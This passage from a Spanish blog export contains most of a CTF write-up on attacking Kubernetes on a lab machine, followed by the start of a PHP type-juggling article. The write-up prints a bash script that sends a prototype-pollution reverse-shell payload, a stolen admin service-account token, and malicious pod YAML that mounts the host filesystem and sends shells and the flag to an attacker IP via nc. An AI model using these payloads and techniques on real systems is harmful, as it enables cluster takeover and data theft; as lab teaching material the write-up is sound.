versions : [   v1  ],  serverAddressByClientCIDRs : [  {    clientCIDR :  0. 0. 0. 0/0 ,    serverAddress :  10. 10. 10. 235:8443   } ]}Bien, peeeeeeeeeeeeerfecto. Vemos que externamente la API esta en el puerto 8443, por lo que podemos asignar las mismas variables (movi√©ndonos el archivo token y cacert) en nuestra m√°quina y deber√≠a funcionar (: Ya que nos podemos comunicar con la API empezar√≠amos a buscar cositas y ver como aprovecharnos de ellas‚Ä¶  Conceptos y arquitectura de Kubernetes. ‚Ä¶ En este post usan una herramienta llamada Kube-Hunter que se encarga de encontrar posibles vulnerabilidades en Kubernetes, descarg√°ndola, movi√©ndola a la m√°quina y ejecutando solo nos muestra una vulnerabilidad: root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ . /kube-hunt --cidr 10. 96. 0. 1 Donde √∫nicamente nos reporta una versi√≥n, pero dando vueltas con ella no logramos nada :‚Äô( En nuestra b√∫squeda llegamos ahora a este post, ac√° juega con la API mediante cURL y una herramienta llamada kubectl, que curiosamente el sistema tiene una tarea programa para en caso de encontrarlo, borrarlo: root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ crontab -l* * * * * find / -name kubectl -exec rm {} \;As√≠ que puede ser importante, pero veamos primero lo de cURL: ‚ö° (Voy a simplificar el output, as√≠ que nos quedaremos con que estamos en &lt;devnode&gt;) &lt;devnode&gt;$ curl --cacert ${CACERT} --header  Authorization: Bearer ${TOKEN}  -X GET ${APISERVER}/api/v1/namespaces/kube-system/secretsPero nos devuelve que no tenemos acceso a ese recurso como nuestro usuario ): peeeeero, ¬øy si quitamos secrets? &lt;devnode&gt;$ curl --cacert ${CACERT} --header  Authorization: Bearer ${TOKEN}  -X GET ${APISERVER}/api/v1/namespaces/kube-system Lindo, empezamos a encontrar rutas que nos devuelven algo distinto a Forbidden, as√≠ que tamos bieeeeen‚Ä¶ Estamos sobre un cluster llamado kube-system, si vamos hacia atras intentando listar los ‚Äúespacios de nombres‚Äù (clusters virtuales) encontramos uno llamativo: &lt;devnode&gt;$ curl --cacert ${CACERT} --header  Authorization: Bearer ${TOKEN}  -X GET ${APISERVER}/api/v1/namespaces{  kind :  NamespaceList ,  apiVersion :  v1 ,  metadata : {   resourceVersion :  65796  },  items : [  {    metadata : {     name :  default ,  . . .     metadata : {     name :  dev ,  . . .     metadata : {     name :  kube-node-lease ,  . . .     metadata : {      name :  kube-public ,  . . .     metadata : {      name :  kube-system ,. . . ¬øCu√°l? Pos si, dev: &lt;devnode&gt;$ curl --cacert ${CACERT} --header  Authorization: Bearer ${TOKEN}  -X GET ${APISERVER}/api/v1/namespaces/devPero no vemos nada relevante, simplemente que ese namespace me son√≥ extra√±o y podemos tenerlo en cuenta por si algo‚Ä¶ ‚Ä¶ Jugando con kubelet nos es m√°s sencillo movernos, as√≠ que siguiendo esta gu√≠a logramos descargarlo, lo subimos a la m√°quina (recuerden cambiarle el nombre, si no, el sistema lo borra) y empezamos a probar cositas: root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://10. 10. 14. 146:8000/kubectl -o kubito Siguiendo este Cheat Sheet de kubectl encontramos el uso de varios comandos. Vamos viendo de manera m√°s sencilla lo que hab√≠amos encontrado con cURL, por ejemplo para ver los ‚Äúespacios de nombre‚Äù simplemente ejecutamos: root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ . /kubito get namespacesNAME       STATUS  AGEdefault      Active  167ddev        Active  167dkube-node-lease  Active  167dkube-public    Active  167dkube-system    Active  167dVemos a dev, que (despues de algunas pruebas) es el unico en el que tenemos ‚Äúpermisos‚Äù para leer cositas distintas a los dem√°s:  Validamos lo que podemos hacer contra cada namespace‚Ä¶ (Cambiamos -n por cada uno: default, kube-node-lease, kube-public y kube-system): root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ . /kubito auth can-i --list -n default    Resources                    Non-Resource URLs           Resource Names  Verbsselfsubjectaccessreviews. authorization. k8s. io  []                  []        [create]selfsubjectrulesreviews. authorization. k8s. io  []                  []        [create]namespaces                   []                  []        [get list]. . . En los 4 podemos ver los namespaces (tenemos el mismo output), pero con dev podemos listar los pods:  Pod es un grupo de uno (aunque sea uno se le llama grupo) o m√°s contenedores dentro de un namespace. root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ . /kubito auth can-i --list -n dev  Resources                    Non-Resource URLs           Resource Names  Verbsselfsubjectaccessreviews. authorization. k8s. io  []                  []        [create]selfsubjectrulesreviews. authorization. k8s. io  []                  []        [create]namespaces                   []                  []        [get list]pods                      []                  []        [get list]. . . Pues echemos un ojo: root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ . /kubito get pods -n dev  NAME                READY  STATUS  RESTARTS  AGEdevnode-deployment-cd86fb5c-6ms8d  1/1   Running  28     167ddevnode-deployment-cd86fb5c-mvrfz  1/1   Running  29     167ddevnode-deployment-cd86fb5c-qlxww  1/1   Running  29     167dBien, encontramos 3 pods, podemos ver una descripci√≥n de cada uno usando describe, por ejemplo veamos la de devnode-deployment-cd86fb5c-6ms8d: &lt;devnode&gt;$ . /kubito describe pod devnode-deployment-cd86fb5c-6ms8d -n dev Es gigante el output :P Name:     devnode-deployment-cd86fb5c-6ms8dNamespace:  devPriority:   0Node:     unobtainium/10. 10. 10. 235Start Time:  Sun, 17 Jan 2021 18:16:21 +0000Labels:    app=devnode       pod-template-hash=cd86fb5cAnnotations: &lt;none&gt;Status:    RunningIP:      172. 17. 0. 4IPs: IP:      172. 17. 0. 4Controlled By: ReplicaSet/devnode-deployment-cd86fb5cContainers:        devnode:          Container ID:  docker://d12ba992b0492f26740ce2664c04a232b9324d5f6c745098b1375682fd16b6c3  Image:     localhost:5000/node_server  Image ID:    docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c  Port:      3000/TCP  Host Port:   0/TCP  State:     Running   Started:   Fri, 02 Jul 2021 05:41:11 +0000  Last State:   Terminated   Reason:    Error   Exit Code:  137   Started:   Wed, 24 Mar 2021 16:01:28 +0000   Finished:   Wed, 24 Mar 2021 16:02:13 +0000  Ready:     True  Restart Count: 28  Environment:  &lt;none&gt;  Mounts:   /var/run/secrets/kubernetes. io/serviceaccount from default-token-rmcd6 (ro)Conditions: Type       Status Initialized    True Ready       True ContainersReady  True PodScheduled   TrueVolumes: default-token-rmcd6:  Type:    Secret (a volume populated by a Secret)  SecretName: default-token-rmcd6  Optional:  falseQoS Class:    BestEffortNode-Selectors: &lt;none&gt;Tolerations:   node. kubernetes. io/not-ready:NoExecute op=Exists for 300s         node. kubernetes. io/unreachable:NoExecute op=Exists for 300sEvents:     &lt;none&gt;(Lo √∫nico que cambia entre los 3 es la direcci√≥n IP en la que est√°n sirviendo: * devnode-deployment-cd86fb5c-6ms8d : 172. 17. 0. 4* devnode-deployment-cd86fb5c-mvrfz : 172. 17. 0. 5* devnode-deployment-cd86fb5c-qlxww : 172. 17. 0. 7(S√≠, s√© lo que puedes estar pensando, tranqui, ya ver√°s) ‚Ä¶ Explotando y molestando al contenedor: Prototype Pollution + Command Injection üìå: Leyendo las descripciones con detenimiento (porque es con lo √∫nico con lo que podemos jugar) vemos que los contenedores est√°n sirviendo en el puerto 3000 un servidor de node, que despu√©s de validar su respuesta record√© nuestra explotaci√≥n inicial hacia el servidor node: root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://172. 17. 0. 4:3000; echo[]root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://172. 17. 0. 5:3000; echo[]root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://172. 17. 0. 6:3000; echocurl: (7) Failed to connect to 172. 17. 0. 6 port 3000: Connection refusedroot@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://172. 17. 0. 7:3000; echo[]La respuesta es nada, pero podemos intentar jugar con alg√∫n servidor de los 3 que hay para ver si estamos ante el mismo servicio que explotamos anteriormente (node), para esto mandemos un mensaje (como los que ya hicimos), solo que ac√° debemos usar cURL: Juguemos con http://172. 17. 0. 5:3000: &lt;devnode&gt;$ curl -s -H 'Content-Type: application/json' -X PUT -d '{ auth :{ name : felamos , password : Winter2021 }, message :{ text : holaaaaa }}' http://172. 17. 0. 5:3000{ ok :true}Al parecer nos dej√≥, por lo que vamos tirando a que efectivamente es el mismo servicio, comprobemos que se subi√≥ el mensaje: root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://172. 17. 0. 5:3000; echo[{ icon : __ , text : holaaaaa , id :1, timestamp :1625437769543, userName : felamos }]Perfecto, pues estamos ejecutando el mismo servicio de antes (:  Perdi mucho tiempo al no centrarme en esto, es claro el path pero en su momento no lo vi :P Segu√≠ enumerando y enumerando y nada, full perdido, as√≠ que me fui a buscar ayuda, esta fue la pista:  ‚ÄúPiensa en webapp como devnode‚Äú‚Ä¶ Dando vueltas con ella ca√≠ en cuenta de algo al mirar la terminal y al leer lo que hab√≠amos hecho hace un momento con cURL y el servidor node: root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$webapp-deployment esta en nuestro hostname yyyyyyy si miramos la descripci√≥n de alg√∫n pod vemos devnode-deployment en su nombre, podemos pensar que estamos situados en alg√∫n contenedor del pod que encierra a la aplicaci√≥n web (webapp), por lo que si existen otros contenedores que (seg√∫n su nombre) hacen referencia a entornos de desarrollo (devnode), probablemente debamos movernos a alguno de ellos :o APAAAA, entiendo tu PISTAAAaaAAAAa. Peeeeero ¬øy como nos movemoooooooos? :( Pues ac√° entra en juego lo que hab√≠amos probado con cURL y los servidores node internos, ya que ellos est√°n sirviendo desde contenedores llamados devnode-deployment. . . y nosotros estamos sobre contenedores llamados webapp-deployment. . . . Por lo que simplemente deber√≠amos volver a ejecutar nuestra explotaci√≥n, pero contra alg√∫n servidor node interno (: Podemos crear un script en bash que nos haga la gesti√≥n muuuucho m√°s r√°pido y sea est√©tico, as√≠ evitamos tener que estar limpiando la terminal por culpa de los comandos cURL tan largos :P (adem√°s de practicar nuestro scripting en bash). #!/bin/bash# CTRL + Cfunction ctrl_c() {  echo  s4l1eNdo. . .  }trap ctrl_c INT# ---- Funciones del programatodo_data() {  cat &lt;&lt;EOF  {     auth : {       name :  felamos ,       password :  Winter2021     },     filename :  todo. txt   }EOF}upload_data() {  cat &lt;&lt;EOF  {     auth : {       name :  felamos ,       password :  Winter2021     },     filename :  &amp; bash -c 'bash &gt;&amp; /dev/tcp/$1/$2 0&gt;&amp;1'   }EOF}message_data() {  cat &lt;&lt;EOF  {     auth : {       name :  felamos ,       password :  Winter2021     },     message : {       text :  holadenuevorey ,       __proto__ : {         canUpload :  true       }    }  }EOF}# ---- Variables globalesURL= $1 IP= $2 PORT= $3 # ---- Inicio del programaif [ -z $URL ] || [ -z $IP ] || [ -z $PORT ]; then  echo -e  \n[!] Uso: $0 http://node_server lhost lport   echo -e  Ejemplo: $0 http://10. 10. 10. 235:31337 10. 10. 14. 146 4433\n   exit 1else  # Asignamos objeto `canUpload`  curl -s -H  Content-Type: application/json  -X PUT -d  $(message_data)  $URL &gt; /dev/null  # Subimos archivo con comando  curl -s -H  Content-Type: application/json  -X POST -d  $(upload_data $IP $PORT)  $URL/upload &gt; /dev/null  echo -e  \n[+] Reverse Shell Generada!!\n fi insidePollutionRCE. sh Les dejo el script por si quieren jugar con √©l, la explotaci√≥n es totalmente igual a la que hicimos, solo que en este caso jugamos con instrucciones de bash.  Tienen que validar que la IP que pongan exista, ya que se generan aleatoriamente y pueda que antes de un reset exista la 172. 17. 0. 5 pero despu√©s no. (El script genera de una vez una Reverse Shell) Lo movemos a la m√°quina, nos ponemos en escucha y ejecutamos de nuevo contra el servidor http://172. 17. 0. 5:3000: PERFECTISIMOOOOOOOOOOOOOOOOOOOOOOO, tamos ahora en uno de los contenedores del pod dev, que lindura :3 ‚Ä¶ Escalada de privilegios #‚Ä¶ Encontramos token -secreto- del admin y obtenemos interacci√≥n total con Kubernetes üìå: Enumerando el sistema no encontramos nada distinto a los contenedores de webapp‚Ä¶ Contamos de nuevo con los archivos para hablar con la API**: root@devnode-deployment-cd86fb5c-mvrfz:/var/run/secrets/kubernetes. io/serviceaccount$ ls ca. crt namespace tokenAs√≠ que podemos intentar ver si ahora tenemos alg√∫n permiso distinto o si descartamos que sea por ac√°. En vez de jugar con cURL subamos ‚Äúkubito‚Äù que ya sabemos que vamos a obtener la misma info pero con un output m√°s est√©tico :D root@devnode-deployment-cd86fb5c-mvrfz:/tmp/testao$ curl http://10. 10. 14. 146:8000/kubectl -o kubitoJugando, jugando y jugando encontramos algo destino al probar de nuevo el subcomando auth can-i contra el namespace kube-system: root@devnode-deployment-cd86fb5c-mvrfz:/tmp/testao$ . /kubito auth can-i --list -n kube-systemResources                    Non-Resource URLs           Resource Names  Verbsselfsubjectaccessreviews. authorization. k8s. io  []                  []        [create]selfsubjectrulesreviews. authorization. k8s. io  []                  []        [create]secrets                     []                  []        [get list]. . . Podemos listar secretos de ese nombre de espacio‚Ä¶ üõ≥Ô∏è Secret: This is the place to store secret data like passwords, API keys, creds, etc. encoded in B64. hacktricks. Perfecto, para listarlos podemos apoyarnos del subcomando get secrets: root@devnode-deployment-cd86fb5c-mvrfz:/tmp/testao$ . /kubito get secrets -n kube-system    NAME                       TYPE                 DATA  AGEattachdetach-controller-token-5dkkr       kubernetes. io/service-account-token  3   169dbootstrap-signer-token-xl4lg           kubernetes. io/service-account-token  3   169dc-admin-token-tfmp2               kubernetes. io/service-account-token  3   168dcertificate-controller-token-thnxw        kubernetes. io/service-account-token  3   169dclusterrole-aggregation-controller-token-scx4p  kubernetes. io/service-account-token  3   169dcoredns-token-dbp92               kubernetes. io/service-account-token  3   169dcronjob-controller-token-chrl7          kubernetes. io/service-account-token  3   169ddaemon-set-controller-token-cb825        kubernetes. io/service-account-token  3   169ddefault-token-l85f2               kubernetes. io/service-account-token  3   169ddeployment-controller-token-cwgst        kubernetes. io/service-account-token  3   169ddisruption-controller-token-kpx2x        kubernetes. io/service-account-token  3   169dendpoint-controller-token-2jzkv         kubernetes. io/service-account-token  3   169dendpointslice-controller-token-w4hwg       kubernetes. io/service-account-token  3   169dendpointslicemirroring-controller-token-9qvzz  kubernetes. io/service-account-token  3   169dexpand-controller-token-sc9fw          kubernetes. io/service-account-token  3   169dgeneric-garbage-collector-token-2hng4      kubernetes. io/service-account-token  3   169dhorizontal-pod-autoscaler-token-6zhfs      kubernetes. io/service-account-token  3   169djob-controller-token-h6kg8            kubernetes. io/service-account-token  3   169dkube-proxy-token-jc8kn              kubernetes. io/service-account-token  3   169dnamespace-controller-token-2klzl         kubernetes. io/service-account-token  3   169dnode-controller-token-k6p6v           kubernetes. io/service-account-token  3   169dpersistent-volume-binder-token-fd292       kubernetes. io/service-account-token  3   169dpod-garbage-collector-token-bjmrd        kubernetes. io/service-account-token  3   169dpv-protection-controller-token-9669w       kubernetes. io/service-account-token  3   169dpvc-protection-controller-token-w8m9r      kubernetes. io/service-account-token  3   169dreplicaset-controller-token-bzbt8        kubernetes. io/service-account-token  3   169dreplication-controller-token-jz8k8        kubernetes. io/service-account-token  3   169dresourcequota-controller-token-wg7rr       kubernetes. io/service-account-token  3   169droot-ca-cert-publisher-token-cnl86        kubernetes. io/service-account-token  3   169dservice-account-controller-token-44bfm      kubernetes. io/service-account-token  3   169dservice-controller-token-pzjnq          kubernetes. io/service-account-token  3   169dstatefulset-controller-token-z2nsd        kubernetes. io/service-account-token  3   169dstorage-provisioner-token-tk5k5         kubernetes. io/service-account-token  3   169dtoken-cleaner-token-wjvf9            kubernetes. io/service-account-token  3   169dttl-controller-token-z87px            kubernetes. io/service-account-token  3   169dListos, tenemos varios secretos, si nos fijamos en la columna TYPE nos indica que todos son kubernetes. io/service-account-token, que buscando un poco por la web entendemos que su contenido ser√° siempre un JSON Web Token, o sea, con los que ya hemos tratado: (/run/secrets/kubernetes. io/serviceaccount/token)Entre toooda la lista vemos algunos con nombre llamativo, pero hay dos que destacan: * root-ca-cert-publisher-token-cnl86* c-admin-token-tfmp2Despues de algunas pruebas (que ya veremos) nos quedamos con c-admin-token-tfmp2, veamos su contenido: (Estoy en otro hostname, pero no importa, estamos en unos de los containers del pod devnode igualmente).  Bien, una prueba que me llego a la cabeza fue intentar crear un pod con nuestro token actual (/run/secrets/kubernetes. io/serviceaccount/token), el token del secreto root-ca-cert-publisher-token-cnl86 y el token del secreto c-admin-token-tfmp2, esta fue la raz√≥n por la que me quede con el token c-admin-token-tfmp2: &lt;devnode&gt;$ TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ. eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9. Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNowTomando algunos ejemplos (como el de hacktricks (cambiamos a namespace: kube-system)) generamos nuestro archivo . yaml y despu√©s para validar si podemos crearlo ejecutar√≠amos: &lt;devnode&gt;$ . /kubito apply -f aaa. yaml -n kube-system    Error from server (Forbidden). . . Pero indic√°ndole el token: &lt;devnode&gt;$ . /kubito apply -f aaa. yaml -n kube-system --token $TOKEN    pod/attacker-pod createdListoneeeeees, al parecer tenemos el token del usuario admin, lo que quiere decir que tenemos interacci√≥n total contra Kubernetes, pues ahora solo nos queda probar y probar cosas para ver con cu√°l logramos explotar esta locura (: ‚Ä¶ Despu√©s de muchas pruebas en las que no estaba pensando, solo probaba y probaba (algo sin sentido :s), frene, mire la terminal y empece a pensar sobre lo que estaba intentando crear. Hubo varios recursos que use para probar, se los dejo por si algo:  Kubernetes Pentest Methodology Part 1.  Escaping from the pod.  Eight Ways to Create a Pod.  Bad Pods: Kubernetes Pod Privilege Escalation.  Y otros que perdi en el camino pensando que no me servian (pero estoy casi seguro que si). Y finalmente este:  Attacking Kubernetes through Kubelet.  Me quedo con este ultimo porque es sencillo de leer y adem√°s fue con el que me pare a pensar sobre que estaba haciendo y con el que finalmente logre crear cositas maliciosas‚Ä¶ ‚Ä¶ Generamos POD malicioso üìå: Ese archivo . yaml genera un pod que cuando se crea nos devuelve una Reverse Shell (adem√°s de montar la ra√≠z del sistema (/) en una ruta llamada /host). Sencillito, nos copiamos ese texto y creamos el archivo . yaml con nuestros comandos, para confirmar que el sistema host tiene nc, vamos a decirle que nos env√≠e el resultado del comando id a nuestro listener: apiVersion: v1kind: Podmetadata: name: testspec: containers: - name: busybox  image: busybox:1. 29. 2  command: [ /bin/sh ]  args: [ -c ,  id | nc 10. 10. 14. 146 4435 ]  volumeMounts:  - name: host   mountPath: /host volumes: - name: host  hostPath:   path: /   type: DirectoryAhora le indicamos que nos cree el pod seg√∫n el contenido del archivo . yaml: &lt;devnode&gt;$ . /kubito -n kube-system --token $TOKEN apply -f aaa. yaml pod/test createdValidamos si se cre√≥: &lt;devnode&gt;$ . /kubito -n kube-system --token $TOKEN get podsNAME                 READY  STATUS       RESTARTS  AGE. . . test                 0/1   ErrImagePull    0     6sPero hay errores, si volvemos a validar el sistema lo termina y despu√©s lo borra: &lt;devnode&gt;$ . /kubito -n kube-system --token $TOKEN get podsNAME                 READY  STATUS       RESTARTS  AGE. . . test                 0/1   Terminating    0     8sPor lo tanto no se ejecuta nuestro comando‚Ä¶ Ac√° estuve un buen rato, probando y probando. (Muchas pruebas e. e) Se me dio por leer los pods que ya existen y comparar algunos campos con los de nuestro archivo . yaml a ver si era que necesit√°bamos algo en especial, si los listamos vemos varios: &lt;devnode&gt;$ . /kubito -n kube-system --token $TOKEN get podsNAME                 READY  STATUS       RESTARTS  AGEbackup-pod              0/1   CrashLoopBackOff  93     168dcoredns-74ff55c5b-sclll        1/1   Running      31     169detcd-unobtainium           1/1   Running      0     117mkube-apiserver-unobtainium      1/1   Running      0     117mkube-controller-manager-unobtainium  1/1   Running      34     169dkube-proxy-zqp45           1/1   Running      31     169dkube-scheduler-unobtainium      1/1   Running      31     169dstorage-provisioner          1/1   Running      63     169dLeyendo el contenido del primer pod (que esta como en alg√∫n tipo de error, pero no se borra (adem√°s su nombre el llamativo)) y comparando sus campos con los nuestros podemos copiar alg√∫n que otro contenido: root@devnode-deployment-cd86fb5c-mvrfz:/tmp/testea$ . /kubito -n kube-system --token $TOKEN describe pod backup-podName:     backup-podNamespace:  kube-systemPriority:   0Node:     unobtainium/10. 10. 10. 235Start Time:  Mon, 18 Jan 2021 16:34:56 +0000Labels:    &lt;none&gt;Annotations: &lt;none&gt;Status:    RunningIP:      172. 17. 0. 9IPs: IP: 172. 17. 0. 9Containers: backup-pod:  Container ID:  docker://64a32a185ef0b218ddaaddb376725f3f709c7cc36b4f5872ebdf179819d189f4  Image:     localhost:5000/dev-alpine  Image ID:    docker-pullable://alpine@sha256:d9a7354e3845ea8466bb00b22224d9116b183e594527fb5b6c3d30bc01a20378  Port:      &lt;none&gt;  Host Port:   &lt;none&gt;                                     State:     Waiting        Reason:    CrashLoopBackOff  Last State:   Terminated   Reason:    Completed   Exit Code:  0   Started:   Mon, 05 Jul 2021 19:53:36 +0000   Finished:   Mon, 05 Jul 2021 19:53:36 +0000  Ready:     False  Restart Count: 94  Environment:  &lt;none&gt;  Mounts:   /var/run/secrets/kubernetes. io/serviceaccount from default-token-l85f2 (ro)Conditions: Type       Status Initialized    True  Ready       False  ContainersReady  False  PodScheduled   TrueVolumes: default-token-l85f2:  Type:    Secret (a volume populated by a Secret)  SecretName: default-token-l85f2  Optional:  falseQoS Class:    BestEffortNode-Selectors: &lt;none&gt;Tolerations:   node. kubernetes. io/not-ready:NoExecute op=Exists for 300s         node. kubernetes. io/unreachable:NoExecute op=Exists for 300sEvents: Type   Reason  Age          From   Message ----   ------  ----          ----   ------- Warning BackOff 4m4s (x532 over 118m) kubelet Back-off restarting failed containerEntre algunos cambios que hice, el que me dio resultado fue el campo Image, el cual vemos que es distinto al de nuestro archivo . yaml:  Adem√°s vemos que ese pod en concreto se comunica con el sistema host unobtainium/10. 10. 10. 235, eso tambi√©n me llamo a atenci√≥n‚Ä¶ aaa. yaml: image: busybox:1. 29. 2backup-pod: image: localhost:5000/dev-alpinePuede ser que nos est√© generando error por eso, ya que la imagen busybox:1. 29. 2 lo m√°s probable es que no exista y por el contrario localhost:5000/dev-alpine si, pues copiemos esa imagen en nuestro pod e intentemos crearlo de nuevo: apiVersion: v1kind: Podmetadata: name: testspec: containers: - name: busybox  image: localhost:5000/dev-alpine  command: [ /bin/sh ]  args: [ -c ,  id | nc 10. 10. 14. 146 4435 ]  volumeMounts:  - name: host   mountPath: /host volumes: - name: host  hostPath:   path: /   type: Directory&lt;devnode&gt;$ . /kubito -n kube-system --token $TOKEN apply -f aaa. yaml Yyyy en nuestro listenerrrrrr: Peeeeeeeerfecto, tenemos ejecuci√≥n remota de comandos, pues entabl√©monos una reverse Shell: apiVersion: v1kind: Podmetadata: name: testspec: containers: - name: busybox  image: localhost:5000/dev-alpine  command: [ /bin/sh ]  args: [ -c ,  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10. 10. 14. 146 4435 &gt;/tmp/f ]  volumeMounts:  - name: host   mountPath: /host volumes: - name: host  hostPath:   path: /   type: DirectoryY ejecutamos: &lt;devnode&gt;$ . /kubito -n kube-system --token $TOKEN apply -f aaa. yaml Y ahora en nuestro listener: Pero la perdemos muy r√°pido (a la vez que se borra el pod), pero podemos aprovecharnos de la carpeta /host que crea el pod para leer la flag: (Podemos obtener una Shell constante de varias formas, ya es cuesti√≥n de su imaginaci√≥n) . . .   args: [ -c ,  cat /host/root/root. txt | nc 10. 10. 14. 146 4435 ]. . . Recibimos: Intente algunas formas de conseguir una Shell sin que se nos cierre pero no lo logre :( Veamos la flag de user. txt: ‚Ä¶ Vaya locura de m√°quina, me encanto la explotaci√≥n inicial, el juntar las dos vulnerabilidades para obtener un solo resultado, incre√≠ble, muy lindo :3 La parte de Kubernetes fue una locura, mucho movimiento lateral. Bonita y entretenida m√°quina, aprendimos bastante y reforzamos cositas que sab√≠amos‚Ä¶ Bueno, no siendo m√°s, muchas gracias por siempre aguantar :* Nos leeremos despu√©s yyyyy A SEGUIR ROMPIENDO TODOOOOOOOOOOOOO!! "
    }, {
    "id": 19,
    "url": "http://localhost:4000/article/type-juggling",
    "title": "Type Juggling == PHP",
    "body": "2021/08/29 - Jugaremos con la pobre validaci√≥n que se hace a veces en formularios o procesos de PHP, estos llevados a cabo con == o !=. ‚Ä¶ En este art√≠culo vamos a explorar una vulnerabilidad en c√≥digos de PHP llamada Type Juggling. Aprovechar√© un reto de un CTF creado por CERT RCTS para explicar este tipo de vuln: üé≤ Gracias https://defendingthesoc. ctf. cert. rcts. pt/. ‚Ä¶ D√©mosle‚Ä¶  Descripci√≥n y exploraci√≥n del reto.      Exploramos y entendemos el c√≥digo PHP del reto.    Hacemos algunos testeos en el programa.     Empezamos a conocernos con el Type Juggling.      ¬øQu√© jeso del Type Juggling?.    Explotamos el Type Juggling.     Automatizamos la b√∫squeda de la cadena que genera el bypass (Type Juggling).  Referencias. ‚Ä¶ Vemos el reto #Some type of juggling‚Ä¶ Entramos al sitio web y obtenemos esto: Nos provee con el c√≥digo fuente de la web y adem√°s nos indica que debemos usar el par√°metro hash para obtener la flag. El c√≥digo fuente es este: &lt;!DOCTYPE HTML&gt;&lt;?php  if(isset($_GET['source'])) {    highlight_file(__FILE__);    die();  } else {    $value =  240610708 ;    if (isset($_GET['hash'])) {      if ($_GET['hash'] === $value) {        die('It is not THAT easy!');      }       $hash = md5($_GET['hash']);      $key = md5($value);      if($hash == $key) {        include('flag. php');        print  Congratulations! Your flag is: $flag ;      } else {        print  Flag not found! ;      }    }   }?&gt;&lt;html&gt; &lt;head&gt;  &lt;title&gt;Challenge 1&lt;/title&gt; &lt;/head&gt; &lt;body&gt;  &lt;h2&gt; Source code says it all&lt;/h2&gt;  &lt;p&gt;Try to get the flag using the 'hash' parameter&lt;/p&gt;  &lt;a target= _blank  href= ?source &gt;See the source code&lt;/a&gt; &lt;/body&gt;&lt;/html&gt;Bien, veamos r√°pidamente que hace el programa‚Ä¶ Review del fuente PHP üìå: El c√≥digo central en el que nos enfocaremos (y el importante) solo esta en esta parte: . . . $value =  240610708 ;if (isset($_GET['hash'])) {  if ($_GET['hash'] === $value) {    die('It is not THAT easy!');  }   $hash = md5($_GET['hash']);  $key = md5($value);  if($hash == $key) {    include('flag. php');. . . Inicialmente vemos que si le pasamos al par√°metro hash el valor 240610708 nos saltar√≠a It is not THAT easy!‚Ä¶ Esto ya que v√°lida si el valor y el tipo de variable (int, float, string‚Ä¶) son iguales.  Operadores de comparaci√≥n en PHP. En caso de no ser iguales y no ver el error, toma el valor del par√°metro y el de la variable $value y genera un hash MD5 (Message-Digest Algorithm 5) para cada uno, que ese tipo de hash es muy usado para comprobar si un archivo ha sido modificado en alguna transmisi√≥n o proceso.  Wikipedia - MD5.  ¬øQu√© es la funci√≥n Hash del MD5 y es segura?. Y como paso final para obtener la flag, v√°lida que los hashes resultantes sean iguales, peeeeeeeeeeero solo su valor, no su tipo. ü§æüèø AC√Å es cuando empezamos a jugar‚Ä¶ Hacemos algunos testeos üìå: Para entender que hace el c√≥digo muuuucho mejor, creamos este con el que jugaremos toooodo el art√≠culo. &lt;?php  $value =  240610708 ;  $hash_get =  &lt;vamos_a_jugar_con_esta_variable&gt; ;  if ($hash_get === $value) {    echo  It is not THAT easy!\n ;    exit(1);  }  $hash = md5($hash_get);  $key = md5($value);  echo  Value:   . $value .   - Hash:   . $key .  \n ;  echo  Hash_GET:   . $hash_get .   - Key:   . $hash .  \n ;  if ($key == $hash) {    echo  \n[+] Iguales. . . 3st4{es_l4_fLA6}\n ;  }   else {    echo  \n[-] No son iguales. . . \n ;  }?&gt;Podemos pensar en enviar el valor 240610708 en el par√°metro, peeero como hay una comprobaci√≥n entre esas dos variables antes de las del hash, vamos a entrar al exit(1): http://challenges. defsoc. tk:8080?hash=240610708$value =  240610708 ;$hash_get =  240610708 ; As√≠ que F. Tambi√©n podr√≠amos pensar en enviar el valor MD5 de 240610708, claramente pasar√≠amos el primer if, pero ¬øobtendr√≠amos la flag? (¬øqu√© dices t√∫ antes de ver la respuesta?) ‚ù± echo -n  240610708  | 